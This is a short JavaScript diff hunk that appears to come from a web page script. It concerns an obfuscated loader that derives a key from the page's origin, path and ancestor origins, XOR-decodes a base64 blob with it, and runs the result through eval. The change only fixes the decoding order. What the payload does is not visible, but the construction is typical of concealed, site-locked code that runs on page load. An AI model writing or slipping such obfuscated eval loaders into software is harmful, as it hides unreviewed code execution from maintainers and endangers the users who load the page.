@@ -20,4 +20,4 @@ function xorStrings(a, b) {
 
 const key = JSON.stringify([location.origin, location.pathname, location.ancestorOrigins]);
 const href = 'OEoaGxkVXl9XWwQbBwFCAlNIRxtJBAMPDR8FBB1IEQIBBglBAQYDS0RIRkBGF0pARVZJRxUEAFxbS0ADBlwFEQ==';
-eval(atob(xorStrings(key, href)));
+eval((xorStrings(key, atob(href))));
